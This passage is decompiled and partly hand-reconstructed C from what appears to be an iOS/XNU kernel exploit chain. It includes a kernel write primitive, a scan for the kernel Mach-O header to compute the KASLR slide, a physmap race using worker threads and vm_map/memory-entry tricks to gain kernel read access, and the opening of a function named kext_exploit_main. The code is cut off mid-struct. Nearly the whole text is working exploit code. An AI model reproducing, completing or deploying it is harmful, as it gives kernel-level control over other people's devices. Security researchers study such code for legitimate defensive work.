            if ( noppl_kwrite32(krwCtx, aliasPage + krwCtx->pageSizeOrSomething + (krwCtx->pageMask & a2), a3) )
              status = 0;
            else
              status = 163856;
          }
          else
          {
            status = 163856;
          }
        }
        else
        {
          status = 163855;
        }
      }
      else
      {
        status = 163857;
      }
    }

RELEASE_LOCK:
    release_write_semaphore_lock(krwCtx, 7u);
    return status;
  }
  return 708642;
}
// 448E0: using guessed type __int64 (__fastcall *off_448E0[7])();

//----- (000000000000BB3C) ----------------------------------------------------
unsigned __int64 __fastcall scan_for_macho_header(__int64 *krwCtx, __int64 a2)
{
  __int64 i; // x1
  __int64 v4; // x20
  unsigned __int64 result; // x0

  for ( i = a2 & 0xFFFFFFFFFFFFC000LL; ; i = *krwCtx - 0x4000 )
  {
    *krwCtx = i;
    if ( (unsigned int)kread_u32_value(krwCtx, i) == (unsigned int)MH_MAGIC_64
      && (unsigned int)kread_u32_value(krwCtx, *krwCtx + 4) == kCFBundleExecutableArchitectureARM64
      && (unsigned int)kread_u32_value(krwCtx, *krwCtx + 8) == MH_EXECUTE
      && (unsigned int)kread_u32_value(krwCtx, *krwCtx + 12) == MH_FILESET )
    {
      break;
    }
  }
  v4 = *krwCtx;
  result = find_kernel_base_ptr(KRWCTX_FROM_UINTPTR(krwCtx[4]));
  krwCtx[1] = v4 - result;
  return result;
}

//----- (000000000000BBF4) ----------------------------------------------------
__int64 __fastcall acquire_physmap_page_atomic(__int64 a1)
{
  PhysmapLoopState *state = (PhysmapLoopState *)a1;
  vm_size_t v1; // x19
  mem_entry_name_port_t v2; // w20
  bool v3; // zf
  unsigned __int8 *v4; // x22
  unsigned __int8 v5; // w8
  vm_address_t address; // [xsp+18h] [xbp-38h] BYREF

  v1 = atomic_load((unsigned __int64 *)&state->freeRegionSize);
  v2 = atomic_load((unsigned int *)&state->workerMemoryEntry);
  TRACE_PHYSMAP("physmap worker enter state=%llx size=%llx port=%x flag=%u count=%u\n",
                (unsigned long long)krwCtx,
                (unsigned long long)v1,
                v2,
                atomic_load((unsigned __int8 *)&state->workerStopFlag),
                atomic_load((unsigned int *)&state->readyWorkerCount));
  if ( v1 )
    v3 = v2 == 0;
  else
    v3 = 1;
  if ( !v3 )
  {
    atomic_fetch_add((atomic_uint *volatile)&state->readyWorkerCount, 1u);
    TRACE_PHYSMAP("physmap worker counted state=%llx count=%u\n",
                  (unsigned long long)a1,
                  atomic_load((unsigned int *)&state->readyWorkerCount));
    v4 = (unsigned __int8 *)&state->workerStopFlag;
    do
    {
      v5 = atomic_load(v4);
      if ( (v5 & 1) != 0 )
        break;
      address = 0;
    }
    while ( vm_map(mach_task_self_, &address, v1, 0, 0, v2, 0, 1, 1, 1, 1u) == 1 );
  }
  TRACE_PHYSMAP("physmap worker exit state=%llx flag=%u count=%u\n",
                (unsigned long long)a1,
                atomic_load((unsigned __int8 *)&state->workerStopFlag),
                atomic_load((unsigned int *)&state->readyWorkerCount));
  return 0;
}

//----- (000000000000BCB4) ----------------------------------------------------
// DONE: this matches the orig asm
__int64 __fastcall query_vm_region_prot_info(vm_address_t a1)
{
    vm_address_t region_address = a1;
    vm_size_t region_size = 0;
    uint32_t depth = 0; // 0x13
    vm_region_submap_info_data_64_t info = {0}; // 16+16+16+13 bytes zeroed
    mach_msg_type_number_t count = 19; // 0x13
    
    kern_return_t kr = vm_region_recurse_64(mach_task_self(),   // w0: loaded from global
                                            &region_address,    // x1: [x29 - 0x8]
                                            &region_size,       // x2: [x29 - 0x10]
                                            &depth,             // x3: [x29 - 0x14]
                                            (vm_region_recurse_info_t)&info, // x4: [sp + 0x10]
                                            &count              // x5: [sp + 0xc]
                                            );
    
    // Return address from info struct at offset +0x44 (sp+0x54 = sp+0x10+0x44)
    // which corresponds to vm_region_submap_info_64.share_mode or similar field
    return (kr == KERN_SUCCESS) ? *(uint64_t *)&info.object_id_full : NULL;
}

//----- (000000000000BD20) ----------------------------------------------------
__int64 __fastcall iokit_slot_alloc_with_mem_entry(__int64 a1, vm_size_t size, __int64 a3, mem_entry_name_port_t *a4)
{
    // x25 = a1 + 0x6648  (pointer to slot count)
    uint32_t *x25 = (uint32_t *)((uint8_t *)a1 + 0x6648);
    
    // w26 = retry counter = 256
    uint32_t w26 = 0x100;
    
    // x27 = mach_task_self_ global
    // w28 = 0x4648 (slot array base offset)
    uint32_t w28 = 0x4648;
    
    do {
        // +76: ldr w24, [x25]
        uint32_t w24 = *x25;
        
        // +80: cmp w24, #0x3ff
        // +84: b.hi → return 3
        if (w24 > 0x3ff)
            return 3;
        
        // x23 = a1 + w24*8 + 0x4648  (pointer to slot entry)
        uint64_t x23 = a1 + ((uint64_t)w24 << 3) + w28;
        
        // +112: vm_allocate(mach_task_self(), x23, size, 3)
        kern_return_t w0 = vm_allocate(mach_task_self(), (vm_address_t *)x23, size, 3);
        
        // +116: cbnz w0 → return error
        if (w0 != KERN_SUCCESS)
            return w0;
        
        // +120..128: (*x25)++
        *x25 = w24 + 1;
        
        // +132..136: query_vm_region_prot_info(*(uint64_t*)x23)
        uint64_t x0 = query_vm_region_prot_info(*(uint64_t *)x23);
        
        // +140: cbz x0 → return 5
        if (x0 == 0)
            return 5;
        
        // +144: cmp x0, a3
        // +148: b.eq → mach_make_memory_entry path
        if (x0 == a3) {
            vm_size_t entry_size = size;  // str x21, [sp, #0x8]
            w0 = mach_make_memory_entry(
                                        mach_task_self(),
                                        &entry_size,              // add x1, sp, #0x8
                                        *(uint64_t *)x23,         // ldr x2, [x23]
                                        VM_PROT_READ | VM_PROT_WRITE,  // 3
                                        a4,                       // x19
                                        0);
            
            // +208: cbnz w0 → return error
            if (w0 != KERN_SUCCESS)
                return w0;
            
            // +212..220: entry_array[w24] = *a4
            // x9 = a1 + w24*4,  then str at x9+0x3644
            uint32_t *entry_array = (uint32_t *)((uint8_t *)a1 + 0x3644);
            entry_array[w24] = (uint32_t)*a4;
            
            return KERN_SUCCESS;
        }
        
        // +152: subs w26, w26, #1
        // +156: b.ne → back to ldr w24, [x25]  (+76)
        w26--;
    } while (w26 != 0);
    
    return 3;  // exhausted retries (falls through to +160 path)
}

//----- (000000000000BE20) ----------------------------------------------------
__int64 __fastcall vm_map_with_retry(vm_address_t *a1, vm_size_t size, vm_address_t mask, int flags, int a5)
{
  int v9; // w23
  __int64 result; // x0
  vm_address_t address; // [xsp+18h] [xbp-48h] BYREF

  v9 = a5 + 1;
  while ( 1 )
  {
    address = *a1;
    result = vm_map(mach_task_self_, &address, size, mask, flags, 0, 0, 0, 3, 7, 1u);
    if ( !(uint32_t)result )
      break;
    if ( !--v9 )
      return result;
  }
  *a1 = address;
  return result;
}

//----- (000000000000BED0) ----------------------------------------------------
__int64 __fastcall kernel_read_loop_physmap(struct_krwCtx *krwCtx, __int64 a2, unsigned int a3, __int64 a4)
{
  PhysmapLoopState *physmapState = (PhysmapLoopState *)a2;
  PhysmapReadResult *out = (PhysmapReadResult *)a4;
  __int64 v7; // x25
  __int64 v8; // x24
  vm_size_t v9; // x21
  int v10; // w20
  unsigned int v11; // w28
  __int64 v12; // x10
  uint64_t *v13; // x20
  vm_size_t v14; // x27
  unsigned __int64 v15; // x9
  unsigned __int64 v16; // x8
  vm_size_t v17; // x22
  __int64 v18; // x9
  vm_size_t v19; // x20
  unsigned __int8 *v20; // x11
  unsigned int *v21; // x12
  unsigned int v26; // w21
  vm_size_t v27; // x27
  __int64 v28; // x0
  vm_address_t v29; // x28
  __int64 v30; // x0
  __int64 memory_entry_64; // x0
  unsigned int v35; // w8
  vm_address_t v38; // x25
  __int64 v39; // x0
  __int64 v40; // x21
  __int64 v41; // x27
  __int64 v42; // x24
  mach_port_t *v43; // x21
  unsigned __int64 v44; // x22
  unsigned __int64 v48; // x8
  unsigned __int64 v49; // x8
  __int64 v50; // x23
  mach_port_t *v51; // x28
  __int64 v52; // x8
  mach_port_t *v53; // x9
  mach_port_t v54; // w10
  __int64 v55; // x11
  unsigned __int64 v56; // x22
  __int64 v57; // x21
  unsigned int v58; // w28
  unsigned __int64 v59; // x23
  unsigned __int64 v60; // x0
  unsigned __int64 v61; // x8
  unsigned __int64 v62; // x9
  unsigned __int64 v63; // x10
  unsigned __int64 v64; // x10
  unsigned __int64 v65; // x9
  unsigned __int64 v66; // x10
  __int64 v67; // x20
  __int64 v68; // x0
  __int64 v69; // x21
  unsigned int v70; // w23
  unsigned __int64 v71; // x28
  unsigned __int64 v72; // x0
  unsigned __int64 v73; // x8
  unsigned __int64 v74; // x9
  unsigned __int64 v75; // x10
  unsigned __int64 v76; // x10
  unsigned __int64 v77; // x9
  unsigned __int64 v78; // x10
  mach_port_t v79; // w8
  __int64 v80; // x12
  vm_size_t v81; // x8
  uint64_t *v82; // x9
  __int64 k; // x8
  __int64 v84; // x11
  __int64 v85; // x21
  __int64 v86; // x21
  __int64 v87; // x0
  unsigned __int8 *v88; // x23
  __int64 v89; // x19
  unsigned __int64 v92; // x22
  bool v93; // w25
  vm_address_t v94; // x1
  __int64 m; // x22
  vm_address_t v96; // x1
  bool v97; // zf
  mach_port_t *v98; // x20
  uint64_t *v100; // x8
  __int64 v101; // x12
  vm_size_t v102; // x9
  uint64_t *v103; // x10
  __int64 i; // x8
  __int64 v105; // x11
  __int64 j; // x8
  __int64 v107; // x11
  int v108; // [xsp+Ch] [xbp-484h]
  vm_size_t v109; // [xsp+10h] [xbp-480h]
  unsigned int v110; // [xsp+1Ch] [xbp-474h]
  __int64 v111; // [xsp+28h] [xbp-468h]
  unsigned int v112; // [xsp+3Ch] [xbp-454h]
  unsigned __int64 v113; // [xsp+48h] [xbp-448h]
  __int64 v114; // [xsp+50h] [xbp-440h]
  __int64 v115; // [xsp+50h] [xbp-440h]
  __int64 v116; // [xsp+58h] [xbp-438h]
  __int64 v117; // [xsp+58h] [xbp-438h]
  unsigned __int64 v118; // [xsp+58h] [xbp-438h]
  int xnuVer; // [xsp+6Ch] [xbp-424h]
  vm_size_t v120; // [xsp+70h] [xbp-420h]
  vm_size_t v121; // [xsp+70h] [xbp-420h]
  mem_entry_name_port_t v122; // [xsp+78h] [xbp-418h] BYREF
  mach_msg_type_number_t v123; // [xsp+7Ch] [xbp-414h] BYREF
  int info[19]; // [xsp+80h] [xbp-410h] BYREF
  natural_t v128; // [xsp+CCh] [xbp-3C4h] BYREF
  vm_size_t v129; // [xsp+D0h] [xbp-3C0h] BYREF
  vm_address_t v130; // [xsp+D8h] [xbp-3B8h] BYREF
  memory_object_size_t v131; // [xsp+E0h] [xbp-3B0h] BYREF
  mach_msg_type_number_t infoCnt; // [xsp+E8h] [xbp-3A8h] BYREF
  natural_t nesting_depth; // [xsp+ECh] [xbp-3A4h] BYREF
  vm_size_t v134; // [xsp+F0h] [xbp-3A0h] BYREF
  vm_address_t v135; // [xsp+F8h] [xbp-398h] BYREF
  vm_address_t free_region_address;
  memory_object_size_t size[10]; // [xsp+100h] [xbp-390h] BYREF
  vm_address_t v139; // [xsp+150h] [xbp-340h] BYREF
  mach_port_t name; // [xsp+15Ch] [xbp-334h] BYREF
  vm_address_t v141; // [xsp+160h] [xbp-330h] BYREF
  vm_address_t address; // [xsp+168h] [xbp-328h] BYREF
  uint64_t v143[16]; // [xsp+170h] [xbp-320h] BYREF
  uint8_t v144[512]; // [xsp+1F0h] [xbp-2A0h] BYREF
  uint8_t v145[40]; // [xsp+3F0h] [xbp-A0h] BYREF
  mach_port_t object_handle[4]; // [xsp+418h] [xbp-78h] BYREF

  v7 = krwCtx;
  memset(object_handle, 0, sizeof(object_handle));
  memset(v145, 0, 32);
  v141 = 0;
  address = 0;
  name = 0;
  v8 = a3;
  v9 = vm_page_size;
  v10 = krwCtx->xnuMajorVersion;
  TRACE_PHYSMAP("kernel_read_loop_physmap start ctx=%llx state=%llx pages=%u out=%llx board=%d page=%llu\n",
                (unsigned long long)a1,
                (unsigned long long)a2,
                a3,
                (unsigned long long)a4,
                v10,
                (unsigned long long)v9);
  if ( (int)number_of_cpus() >= 3 && (int)number_of_cpus() > 5 )
  {
    v11 = 4;
LABEL_6:
    v12 = 100;
    goto LABEL_9;
  }
  if ( (int)number_of_cpus() < 3 )
  {
    v11 = 1;
  }
  else
  {
    v11 = number_of_cpus() - 1;
    if ( v11 > 3 )
      goto LABEL_6;
  }
  v12 = 200;
LABEL_9:
  memset(v144, 0, sizeof(v144));
  memset(v143, 0, sizeof(v143));
  xnuVer = v10;
  if ( _os_alloc_once_table[160] == -1 )
  {
    v13 = (uint64_t *)_os_alloc_once_table[161];
    TRACE_PHYSMAP("kernel_read_loop_physmap os_alloc_once cached slot=%llx base=%llx size=%llx\n",
                  (unsigned long long)v13,
                  v13 ? (unsigned long long)v13[0] : 0,
                  v13 ? (unsigned long long)v13[1] : 0);
  }
  else
  {
    v67 = v12;
    v68 = (__int64)_os_alloc_once(&_os_alloc_once_table[160], 0x10u, 0);
    v12 = v67;
    v13 = (uint64_t *)v68;
    TRACE_PHYSMAP("kernel_read_loop_physmap os_alloc_once init slot=%llx base=%llx size=%llx\n",
                  (unsigned long long)v13,
                  v13 ? (unsigned long long)v13[0] : 0,
                  v13 ? (unsigned long long)v13[1] : 0);
  }
  v14 = v9 * v8;
#if RECOMP_PHYSMAP_VALIDATE_CACHE
  if ( *v13 && v13[1] && v13[1] < v14 + 2 * v9 )
  {
    TRACE_PHYSMAP("kernel_read_loop_physmap stale cached region base=%llx size=%llx required=%llx; rescanning\n",
                  (unsigned long long)v13[0],
                  (unsigned long long)v13[1],
                  (unsigned long long)(v14 + 2 * v9));
    *v13 = 0;
    v13[1] = 0;
    physmapState->freeRegionBase = 0;
    atomic_store(0, (unsigned __int64 *)&physmapState->freeRegionSize);
  }
#endif
  if ( *v13 && (v15 = v13[1]) != 0 )
  {
    physmapState->freeRegionBase = *v13;
    atomic_store(v15, (unsigned __int64 *)&physmapState->freeRegionSize);
  }
  else if ( !physmapState->freeRegionBase )
  {
    v115 = v8;
    v117 = v12;
    free_region_address = 0;
    v139 = 0;
    v42 = physmap_find_free_vm_region(v14 + 2 * vm_page_size, &free_region_address, &v139);
    if ( (uint32_t)v42 )
    {
      v19 = 0;
      v120 = 0;
      goto LABEL_170;
    }
    physmapState->freeRegionBase = free_region_address;
    atomic_store(v139, (unsigned __int64 *)&physmapState->freeRegionSize);
    *v13 = free_region_address;
    v13[1] = v139;
    TRACE_PHYSMAP("kernel_read_loop_physmap free region base=%llx size=%llx required=%llx\n",
                  (unsigned long long)free_region_address,
                  (unsigned long long)v139,
                  (unsigned long long)(v14 + 2 * vm_page_size));
    v8 = v115;
    v12 = v117;
  }
  if ( physmapState->freeRegionBase && (v16 = atomic_load((unsigned __int64 *)&physmapState->freeRegionSize)) != 0 )
  {
    v114 = v8;
    v116 = v12;
    v110 = a3;
    v17 = 0;
    v18 = 0;
    v19 = atomic_load((unsigned __int64 *)&physmapState->freeRegionSize);
    v20 = (unsigned __int8 *)&physmapState->workerStopFlag;
    v21 = (unsigned int *)&physmapState->readyWorkerCount;
    v109 = v14;
    v113 = v11;
    while ( 1 )
    {
      v111 = v18;
      atomic_store(0, v20);
      atomic_store(0, v21);
      memset(object_handle, 0, sizeof(object_handle));
      TRACE_PHYSMAP("kernel_read_loop_physmap iter=%lld workers=%u mem_size=%llx map_base=%llx cached_size=%llx\n",
                    (long long)v18,
                    v11,
                    (unsigned long long)v19,
                    (unsigned long long)physmapState->freeRegionBase,
                    (unsigned long long)atomic_load((unsigned __int64 *)&physmapState->freeRegionSize));
      if ( v11 )
      {
        v42 = physmap_make_worker_memory_entries(v19, physmapState->freeRegionBase, v11, object_handle, &v26);
        if ( (uint32_t)v42 )
        {
          v120 = v17;
          goto LABEL_170;
        }
        v112 = v11;
      }
      else
      {
        v112 = 0;
        v26 = 0;
      }
      atomic_store(v26, (unsigned int *)&physmapState->workerMemoryEntry);
      v27 = vm_page_size;
      v28 = vm_map(mach_task_self_, &address, v19, 0, 1, v26, 0, 0, 1, 1, 1u);
      if ( (uint32_t)v28 || (v28 = vm_map_with_retry(&v141, v27 + v19, 0x1FFFFFFu, 9, 16), (uint32_t)v28) )
      {
        v42 = v28;
        v120 = v17;
LABEL_169:
        v11 = v112;
        goto LABEL_170;
      }
      v120 = v27 + v19;
      v29 = v141;
      v30 = vm_copy(mach_task_self_, address, v19, v141);
      if ( (uint32_t)v30
        || (v30 = vm_deallocate(mach_task_self_, address, v19), (uint32_t)v30)
        || (address = 0, v139 = v29 + v19, v30 = vm_allocate(mach_task_self_, &v139, v27, 100679680), (uint32_t)v30)
        || (v30 = vm_deallocate(mach_task_self_, v139, v27), (uint32_t)v30) )
      {
        v42 = v30;
        goto LABEL_169;
      }
      v134 = 0;
      v135 = v29;
      memset(size, 0, 19 * sizeof(natural_t));
      infoCnt = 19;
      nesting_depth = 0;
      memory_entry_64 = vm_region_recurse_64(
                          mach_task_self_,
                          &v135,
                          &v134,
                          &nesting_depth,
                          (vm_region_recurse_info_t)size,
                          &infoCnt);
      v11 = v112;
      if ( (uint32_t)memory_entry_64 )
      {
        v42 = memory_entry_64;
        goto LABEL_72;
      }
      v108 = *(uint32_t *)((char *)size + 0x28);
      if ( v112 )
      {
        v42 = physmap_start_worker_threads((pthread_t *)v145, v113, a2);
        if ( (uint32_t)v42 )
          goto LABEL_72;
      }
      while ( 1 )
      {
        v35 = atomic_load((unsigned int *)&physmapState->readyWorkerCount);
        if ( v35 == v112 )
          break;
        TRACE_PHYSMAP("kernel_read_loop_physmap wait workers count=%u expected=%u flag=%u\n",
                      v35,
                      v112,
                      atomic_load((unsigned __int8 *)&physmapState->workerStopFlag));
        semaphore_timedwait_ns(v7, 0x3E8u);
      }
      TRACE_PHYSMAP("kernel_read_loop_physmap workers ready count=%u expected=%u\n", v35, v112);
      v131 = v19;
      memory_entry_64 = mach_make_memory_entry_64(mach_task_self_, &v131, 0, 1, &name, v26);
      if ( (uint32_t)memory_entry_64 )
      {
        v42 = memory_entry_64;
        goto LABEL_72;
      }
      if ( v131 != v19 )
      {
        v42 = 5;
        goto LABEL_72;
      }
      v121 = v7;
      atomic_store(1u, (unsigned __int8 *)&physmapState->workerStopFlag);
      if ( v112 )
      {
        memory_entry_64 = physmap_join_worker_threads((pthread_t *)v145, v113);
        if ( (uint32_t)memory_entry_64 )
        {
          v42 = memory_entry_64;
LABEL_72:
          v120 = v19;
          goto LABEL_170;
        }
      }
      v38 = v141;
      v129 = 0;
      v130 = v141;
      v128 = 0;
      memset(info, 0, 19 * sizeof(natural_t));
      v123 = 19;
      v39 = vm_region_recurse_64(mach_task_self_, &v130, &v129, &v128, info, &v123);
      if ( (uint32_t)v39 )
        goto LABEL_167;
      v40 = (unsigned int)(v108 + 1);
      v41 = *(uint32_t *)((char *)info + 0x28);
      v42 = 5;
      if ( v41 < (unsigned int)v40 - v112 || v41 > (unsigned int)v40 )
        goto LABEL_168;
      if ( v41 < (unsigned int)v40 )
      {
        v122 = 0;
        v42 = 5;
        v48 = v40 - v41;
        if ( v40 != v41 && v48 <= v113 )
        {
          v49 = v113 - v48;
          v118 = v49 + 1;
          if ( v49 == -1 )
          {
LABEL_83:
            if ( v118 < v113 )
            {
              v52 = ~v41 + v40;
              v53 = &object_handle[v113 + v41 - v40 + 1];
              do
              {
                v54 = *v53;
                v55 = physmapState->retainedWorkerMemoryEntryCount;
                physmapState->retainedWorkerMemoryEntryCount = v55 + 1;
                physmapState->retainedWorkerMemoryEntries[v55] = v54;
                *v53++ = 0;
                --v52;
              }
              while ( v52 );
            }
            v56 = *(uint64_t *)((char *)info + 0x44);
            if ( xnuVer <= 8791 )
            {
              v69 = 0;
              v70 = 0;
              v71 = *(uint64_t *)((char *)info + 0x44);
              while ( 1 )
              {
                v39 = vm_allocate(mach_task_self_, (vm_address_t *)&v144[v69], vm_page_size, 3);
                if ( (uint32_t)v39 )
                  break;
                v72 = query_vm_region_prot_info(*(uint64_t *)&v144[v69]);
                if ( !v72 )
                  goto LABEL_146;
                v73 = *(unsigned int *)(v121 + 384);
                if ( v72 >= v71 )
                  v74 = v71;
                else
                  v74 = v72;
                if ( v72 <= v71 )
                  v75 = v71;
                else
                  v75 = v72;
                if ( v75 - v74 >= v73 )
                  goto LABEL_135;
                if ( v72 >= v56 )
                  v76 = v56;
                else
                  v76 = v72;
                if ( v72 > v56 )
                  v56 = v72;
                if ( v56 - v76 >= v73 )
                {
LABEL_135:
                  if ( !v70 && v69 )
                    goto LABEL_158;
                  ++v70;
                  v71 = v72;
                  v56 = v72;
                }
                else
                {
                  v71 = v74;
                }
                if ( v70 >= 2 )
                {
                  v77 = *(uint64_t *)((char *)info + 0x44);
                  if ( v72 >= *(uint64_t *)((char *)info + 0x44) )
                    v78 = *(uint64_t *)((char *)info + 0x44);
                  else
                    v78 = v72;
                  if ( v72 > *(uint64_t *)((char *)info + 0x44) )
                    v77 = v72;
                  if ( v77 - v78 >= v73 )
                  {
LABEL_158:
                    v42 = mach_port_deallocate(mach_task_self_, name);
                    if ( (uint32_t)v42 )
                      goto LABEL_168;
                    v85 = 0;
                    name = 0;
                    while ( 1 )
                    {
                      v39 = vm_allocate(mach_task_self_, &v143[v85], v19, 3);
                      if ( (uint32_t)v39 )
                        goto LABEL_167;
                      if ( ++v85 == 16 )
                      {
                        v86 = 0;
                        while ( 1 )
                        {
                          v87 = query_vm_region_prot_info(v143[v86]);
                          if ( !v87 )
                            goto LABEL_146;
                          if ( v87 == *(uint64_t *)((char *)info + 0x44) )
                          {
                            v100 = (uint64_t *)v143[v86];
                            v143[v86] = 0;
                            if ( !v100 )
                            {
LABEL_219:
                              out->mapping = v38;
                              out->requestedSize = 0;
                              out->mappedSize = v19;
                              out->pageCount = 0;
                              v42 = 5;
                              v141 = 0;
                              goto LABEL_168;
                            }
                            v101 = v114;
                            if ( v110 )
                            {
                              v102 = vm_page_size;
                              v103 = v100;
                              do
                              {
                                *v103 = physmapState->marker;
                                v103 = (uint64_t *)((char *)v103 + v102);
                                --v101;
                              }
                              while ( v101 );
                            }
                            out->mapping = v100;
                            out->requestedSize = v109;
                            out->mappedSize = v19;
                            out->pageCount = v110;
                            v42 = vm_deallocate(mach_task_self_, v38, v19);
                            if ( !(uint32_t)v42 )
                            {
                              v141 = 0;
                              if ( !(unsigned int)iokit_slot_alloc_with_mem_entry(a2, v19, *(uint64_t *)((char *)info + 0x44), &v122) )
                                out->memoryEntry = v122;
                              for ( i = 0; i != 16; ++i )
                              {
                                v105 = v143[i];
                                if ( v105 )
                                {
                                  out->backupMappings[i] = v105;
                                  v143[i] = 0;
                                }
                              }
                              for ( j = 0; j != 512; j += 8 )
                              {
                                v107 = *(uint64_t *)&v144[j];
                                if ( v107 )
                                {
                                  out->workerScratchPages[j / 8] = v107;
                                  *(uint64_t *)&v144[j] = 0;
                                }
                              }
                              return 0;
                            }
                            goto LABEL_168;
                          }
                          if ( ++v86 == 16 )
                            goto LABEL_219;
                        }
                      }
                    }
                  }
                }
                v69 += 8;
                if ( v69 == 512 )
                {
LABEL_145:
                  out->mapping = v38;
                  out->requestedSize = 0;
                  out->mappedSize = v19;
                  v79 = name;
                  out->pageCount = 0;
                  out->memoryEntry = v79;
                  v141 = 0;
                  name = 0;
LABEL_146:
                  v42 = 5;
                  goto LABEL_168;
                }
              }
            }
            else
            {
              v57 = 0;
              v58 = 0;
              v59 = *(uint64_t *)((char *)info + 0x44);
              while ( 1 )
              {
                v39 = vm_allocate(mach_task_self_, (vm_address_t *)&v144[v57], vm_page_size, 3);
                if ( (uint32_t)v39 )
                  break;
                v60 = query_vm_region_prot_info(*(uint64_t *)&v144[v57]);
                if ( !v60 )
                  goto LABEL_146;
                v61 = *(unsigned int *)(v121 + 384);
                if ( v60 >= v59 )
                  v62 = v59;
                else
                  v62 = v60;
                if ( v60 <= v59 )
                  v63 = v59;
                else
                  v63 = v60;
                if ( v63 - v62 >= v61 )
                  goto LABEL_105;
                if ( v60 >= v56 )
                  v64 = v56;
                else
                  v64 = v60;
                if ( v60 > v56 )
                  v56 = v60;
                if ( v56 - v64 >= v61 )
                {
LABEL_105:
                  if ( !v58 && v57 )
                    goto LABEL_147;
                  ++v58;
                  v59 = v60;
                  v56 = v60;
                }
                else
                {
                  v59 = v62;
                }
                if ( v58 >= 2 )
                {
                  v65 = *(uint64_t *)((char *)info + 0x44);
                  if ( v60 >= *(uint64_t *)((char *)info + 0x44) )
                    v66 = *(uint64_t *)((char *)info + 0x44);
                  else
                    v66 = v60;
                  if ( v60 > *(uint64_t *)((char *)info + 0x44) )
                    v65 = v60;
                  if ( v65 - v66 >= v61 )
                  {
LABEL_147:
                    v80 = v114;
                    if ( v110 )
                    {
                      v81 = vm_page_size;
                      v82 = (uint64_t *)v38;
                      do
                      {
                        *v82 = physmapState->marker;
                        v82 = (uint64_t *)((char *)v82 + v81);
                        --v80;
                      }
                      while ( v80 );
                    }
                    out->mapping = v38;
                    out->requestedSize = v109;
                    out->pageCount = v110;
                    out->mappedSize = v19;
                    v42 = mach_port_deallocate(mach_task_self_, name);
                    if ( !(uint32_t)v42 )
                    {
                      name = 0;
                      if ( !(unsigned int)iokit_slot_alloc_with_mem_entry(a2, v19, *(uint64_t *)((char *)info + 0x44), &v122) )
                        out->memoryEntry = v122;
                      for ( k = 0; k != 512; k += 8 )
                      {
                        v84 = *(uint64_t *)&v144[k];
                        if ( v84 )
                        {
                          out->workerScratchPages[k / 8] = v84;
                          *(uint64_t *)&v144[k] = 0;
                        }
                      }
                      return 0;
                    }
                    goto LABEL_168;
                  }
                }
                v57 += 8;
                if ( v57 == 512 )
                  goto LABEL_145;
              }
            }
          }
          else
          {
            v50 = v113 + v41 - v40 + 1;
            v51 = object_handle;
            while ( 1 )
            {
              v39 = mach_port_deallocate(mach_task_self_, *v51);
              if ( (uint32_t)v39 )
                break;
              *v51++ = 0;
              if ( !--v50 )
                goto LABEL_83;
            }
          }
LABEL_167:
          v42 = v39;
        }
LABEL_168:
        v120 = v19;
        goto LABEL_169;
      }
      v39 = vm_deallocate(mach_task_self_, v38, v19);
      v11 = v112;
      if ( (uint32_t)v39 )
        goto LABEL_167;
      v141 = 0;
      v39 = mach_port_deallocate(mach_task_self_, name);
      if ( (uint32_t)v39 )
        goto LABEL_167;
      name = 0;
      v7 = v121;
      if ( v112 )
      {
        v43 = object_handle;
        v44 = v113;
        do
        {
          v39 = mach_port_deallocate(mach_task_self_, *v43);
          if ( (uint32_t)v39 )
            goto LABEL_167;
          *v43++ = 0;
        }
        while ( --v44 );
      }
      v20 = (unsigned __int8 *)&physmapState->workerStopFlag;
      v18 = v111 + 1;
      v42 = 5;
      v17 = v19;
      v21 = (unsigned int *)&physmapState->readyWorkerCount;
      if ( v111 + 1 == v116 )
        return v42;
    }
  }
  else
  {
    v19 = 0;
    v120 = 0;
    v42 = 5;
  }
LABEL_170:
  v88 = (unsigned __int8 *)&physmapState->workerStopFlag;
  v89 = v11;
  do
  {
LABEL_171:
    atomic_store(1u, v88);
    if ( v11 )
    {
      physmap_join_worker_threads((pthread_t *)v145, v11);
    }
    v92 = 0;
    v93 = 1;
    do
    {
      v94 = v143[v92];
      if ( v94 )
      {
        v42 = vm_deallocate(mach_task_self_, v94, v19);
        if ( (uint32_t)v42 )
          break;
        v143[v92] = 0;
      }
      v93 = v92++ < 0xF;
    }
    while ( v92 != 16 );
  }
  while ( v93 );
  for ( m = 0; m != 512; m += 8 )
  {
    v96 = *(uint64_t *)&v144[m];
    if ( v96 )
    {
      v42 = vm_deallocate(mach_task_self_, v96, vm_page_size);
      if ( (uint32_t)v42 )
        goto LABEL_171;
      *(uint64_t *)&v144[m] = 0;
    }
  }
  if ( v141 )
    v97 = v120 == 0;
  else
    v97 = 1;
  if ( !v97 )
    vm_deallocate(mach_task_self_, v141, v120);
  if ( address && v19 )
    vm_deallocate(mach_task_self_, address, v19);
  if ( name + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, name);
  if ( v11 )
  {
    v98 = object_handle;
    do
    {
      if ( *v98 + 1 >= 2 )
        mach_port_deallocate(mach_task_self_, *v98);
      ++v98;
      --v89;
    }
    while ( v89 );
  }
  TRACE_PHYSMAP("kernel_read_loop_physmap exit err=%lld state=%llx v141=%llx address=%llx name=%x workers=%u\n",
                (long long)v42,
                (unsigned long long)a2,
                (unsigned long long)v141,
                (unsigned long long)address,
                name,
                v11);
  return v42;
}
// 19728: using guessed type __int64 __fastcall nullsub_1(uint64_t);

//----- (000000000000CB98) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
__int64 __fastcall kext_exploit_main(uint64_t x0, uint32_t w1, uint64_t x2)
{
  uint32_t *v5; // x20
  int v7; // w21
  uint64_t v8; // x19
  int v9; // w0
  int v10; // w8
  __int64 v11; // x19
  int v12; // w0
  void *(__cdecl *threadEntry)(void *); // x0
  int v14; // w8
  mach_port_t v15; // w20
  __int64 i; // x22
  mach_port_name_t v17; // w1
  __int64 j; // x21
  mach_port_name_t v19; // w1
  uint32_t *v20; // x0
  unsigned int v21; // w8
  unsigned __int64 v22; // x21
  mach_port_name_t v23; // w1
  struct
  {
    uint32_t v25[2824]; // [xsp+8h] [xbp-66E8h] BYREF
    vm_address_t address; // [xsp+2C28h] [xbp-3AC8h]
    vm_size_t size; // [xsp+2C30h] [xbp-3AC0h]
    vm_address_t v28; // [xsp+2C38h] [xbp-3AB8h]
    vm_size_t v29; // [xsp+2C40h] [xbp-3AB0h]
    uint8_t v30[2096]; // [xsp+2C48h] [xbp-3AA8h]
    mach_port_name_t name; // [xsp+3478h] [xbp-3278h]
    void *v32; // [xsp+3480h] [xbp-3270h]
    unsigned int v33; // [xsp+3488h] [xbp-3268h]
    vm_address_t v34; // [xsp+3490h] [xbp-3260h]
    vm_size_t v35; // [xsp+3498h] [xbp-3258h]
